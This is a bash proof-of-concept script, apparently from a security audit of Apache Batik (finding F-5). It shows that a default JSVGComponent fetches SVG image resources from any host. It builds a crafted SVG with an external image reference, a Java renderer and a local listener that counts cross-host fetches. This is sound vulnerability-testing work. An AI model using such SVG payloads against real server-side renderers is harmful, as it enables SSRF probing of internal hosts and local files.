#!/usr/bin/env bash
# F-5 — Insecure default: JSVGCanvas/JSVGComponent (and Squiggle) load external resources with NO
# origin restriction. A bare `new JSVGCanvas()` supplies a null SVGUserAgent, so
# JSVGComponent.BridgeUserAgent.getExternalResourceSecurity returns RelaxedExternalResourceSecurity
# (empty check -> any host/scheme). Squiggle defaults ALLOWED_EXTERNAL_RESOURCE_ORIGIN=ANY; the standard
# SVGUserAgentAdapter hardcodes Relaxed for both resources and scripts.
# FRAMING: this is an unsafe DEFAULT / embedding footgun (Relaxed is documented to load from anywhere),
# not a bypass of an active restriction. It is LESS restrictive than the transcoder (same-host default).
# Impact: blind SSRF + local file open/parse of Batik-parseable resources. Severity: Medium hardening;
# High in a server-side embedding that renders untrusted SVG and returns/exposes the output.
set -uo pipefail
LAB="${BATIK_LAB_DIR:-/tmp/batik-lab}"; cd "$LAB"
CP="$(printf '%s' "$LAB/batik-1.19/lib/*")"

cat > f5.svg <<'SVG'
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20">
  <image x="0" y="0" width="20" height="20" xlink:href="http://127.0.0.1:9999/canvas-probe"/></svg>
SVG
cat > F5Probe.java <<'JAVA'
import org.apache.batik.swing.svg.JSVGComponent;
import org.apache.batik.anim.dom.SAXSVGDocumentFactory;
import org.apache.batik.util.XMLResourceDescriptor;
import org.w3c.dom.svg.SVGDocument; import java.io.*;
public class F5Probe {
  public static void main(String[] a) throws Exception {
    System.setProperty("java.awt.headless","true");
    SAXSVGDocumentFactory df = new SAXSVGDocumentFactory(XMLResourceDescriptor.getXMLParserClassName());
    // document served from an ATTACKER host; a same-host policy would BLOCK 127.0.0.1:9999
    SVGDocument doc = df.createSVGDocument("http://198.51.100.9/doc.svg", new FileInputStream("/tmp/batik-lab/f5.svg"));
    JSVGComponent comp = new JSVGComponent();   // svgUserAgent == null -> Relaxed
    comp.setSize(20,20); comp.setSVGDocument(doc);
    Thread.sleep(8000);
  }
}
JAVA
javac -cp "$CP" F5Probe.java
cat > f5srv.py <<'PY'
import http.server, socketserver, threading, time
HIT={"n":0}
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self): HIT["n"]+=1; print("CANVAS_HIT %s"%self.path,flush=True); self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
threading.Thread(target=lambda:socketserver.TCPServer(("127.0.0.1",9999),H).serve_forever(),daemon=True).start()
time.sleep(14); print("HITS=%d"%HIT["n"],flush=True)
PY
python3 f5srv.py > f5.log 2>&1 & SRV=$!; sleep 1
echo "== default JSVGComponent (no SVGUserAgent) rendering an SVG whose doc host is 198.51.100.9 =="
timeout 30 java -cp "$CP:$LAB" F5Probe >/dev/null 2>&1
sleep 2
grep -c CANVAS_HIT f5.log | xargs echo "cross-host fetches (a same-host policy would block these):"
kill $SRV 2>/dev/null
echo "EXPECT: >=1 CANVAS_HIT on 127.0.0.1:9999 despite the doc host being 198.51.100.9 (Relaxed default)."
